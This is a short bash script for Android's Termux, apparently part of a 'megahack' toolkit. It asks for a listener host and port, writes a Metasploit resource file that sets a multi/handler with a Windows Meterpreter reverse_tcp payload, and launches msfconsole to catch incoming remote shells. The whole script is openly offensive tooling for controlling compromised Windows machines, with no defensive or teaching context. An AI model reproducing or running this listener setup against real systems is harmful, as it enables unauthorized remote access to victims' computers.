#!/data/data/com.termux/files/usr/bin/bash
cd $HOME/megahack
rm -rf .d.rc
clear
figlet STARTING | lolcat -t
figlet LISTNER | lolcat -t 
echo " "
tput setaf 1; echo "LHOST"
read lhost
tput setaf 2; echo "INTER LISTNER PORT"
read port
echo "use exploit/multi/handler" > .d.rc
echo "set payload windows/meterpreter/reverse_tcp" >> .d.rc
echo "set lhost $lhost" >> .d.rc
echo "set lport $port" >> .d.rc
echo "exploit" >> .d.rc
msfconsole -r .d.rc
cd $HOME/megahack && bash megahack

